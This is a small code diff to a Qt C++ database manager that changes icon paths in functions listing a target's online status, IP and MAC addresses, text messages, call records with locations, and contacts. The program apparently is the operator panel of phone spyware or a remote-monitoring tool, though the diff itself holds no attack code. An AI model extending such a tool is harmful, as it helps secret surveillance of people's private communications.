@@ -575,7 +575,7 @@ void DatabaseManager::QueryLogInfo(ULONG targetId, PageTableWidget* table)
 
 		if ( query.value(1).toString() == QString::fromLocal8Bit("上线") )
 		{
-			time->setIcon(QIcon(QPixmap(":/image/normalmsg.png")));
+			time->setIcon(QIcon(QPixmap("image/normalmsg.png")));
 			if ( lastStatus )
 			{
 				AddFakeRow(false, time, status, publicIp, localIp, macAddress, proc, user, table);
@@ -584,7 +584,7 @@ void DatabaseManager::QueryLogInfo(ULONG targetId, PageTableWidget* table)
 		}
 		else
 		{
-			time->setIcon(QIcon(QPixmap(":/image/errormsg.png")));
+			time->setIcon(QIcon(QPixmap("image/errormsg.png")));
 
 			if ( !lastStatus )
 			{
@@ -638,12 +638,12 @@ void DatabaseManager::AddFakeRow(
 
 	if ( online )
 	{
-		timeNew->setIcon(QIcon(QPixmap(":/image/normalmsg.png")));
+		timeNew->setIcon(QIcon(QPixmap("image/normalmsg.png")));
 		statusNew->setText(QString::fromLocal8Bit("上线"));
 	}
 	else
 	{
-		timeNew->setIcon(QIcon(QPixmap(":/image/errormsg.png")));
+		timeNew->setIcon(QIcon(QPixmap("image/errormsg.png")));
 		statusNew->setText(QString::fromLocal8Bit("下线"));
 	}
 
@@ -3382,7 +3382,7 @@ int DatabaseManager::QuerySMSData(ULONG dwTargetId, QTableWidget* table)
 		message->setText(query.value(5).toString());
 		getTime->setText(query.value(6).toString());
 
-		//time->setIcon(QIcon(QPixmap(":/image/message.png")));
+		//time->setIcon(QIcon(QPixmap("image/message.png")));
 
 		table->insertRow(0);
 		table->setItem(0, 0, time);
@@ -3440,7 +3440,7 @@ int DatabaseManager::QueryCALData(unsigned int dwTargetId, QTableWidget* table)
 		location->setText(query.value(7).toString());
 		network->setText(query.value(8).toString());
 
-		//time->setIcon(QIcon(QPixmap(":/image/call.png")));
+		//time->setIcon(QIcon(QPixmap("image/call.png")));
 
 		table->insertRow(0);
 		table->setItem(0, 0, time);
@@ -3490,7 +3490,7 @@ int DatabaseManager::QueryCONTACTData(unsigned int dwTargetId, QTableWidget* tab
 		location->setText(query.value(6).toString());
 		network->setText(query.value(7).toString());
 
-		name->setIcon(QIcon(QPixmap(":/image/group.png")));
+		name->setIcon(QIcon(QPixmap("image/group.png")));
 
 		table->insertRow(0);
 		table->setItem(0, 0, name);
